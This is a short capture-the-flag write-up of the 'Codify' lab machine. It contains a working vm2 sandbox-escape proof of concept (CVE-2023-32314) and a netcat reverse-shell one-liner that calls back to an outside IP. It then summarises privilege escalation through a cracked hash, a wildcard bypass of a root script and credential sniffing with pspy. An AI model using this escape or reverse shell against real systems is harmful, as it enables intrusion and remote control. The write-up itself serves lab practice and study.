Started with a nmap scan
```
22 OpenSSH 8.2p1
80 Apache httpd 2.4.52
3000 Node.js
```
There is a domain linked to the webservice `codify.htb` its a webapp that  is running node,js code for us and in the about page says it uses a `vm2` package and its running version `3.9.16` which is vulnerable to `CVE-2023-32314` and here is a poc for reading the filesystem 
```
const { VM } = require("vm2");
const vm = new VM();

const code = `
  const err = new Error();
  err.name = {
    toString: new Proxy(() => "", {
      apply(target, thiz, args) {
        const process = args.constructor.constructor("return process")();
        throw process.mainModule.require("child_process").execSync("ls -la").toString();
      },
    }),
  };
  try {
    err.stack;
  } catch (stdout) {
    stdout;
  }
`;

console.log(vm.run(code)); // -> whoami
```
using this payload we can get a call bac `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.3 9001 >/tmp/f` and now we are the `svc` user looking in the `tickets.db` file we found a hash for the user Joshua `$2a$12$SOn8Pf6z8fO/nVsNbAAequ/....................../p/Zw2` which is a user on the system and it cracked to `.........` and now we can SSH into the host and there is a script we can run as root and to bypass the login for the script we use `*` now we can use `pspy` to catch the root creds for mysql database `............` and now we can read the root flag 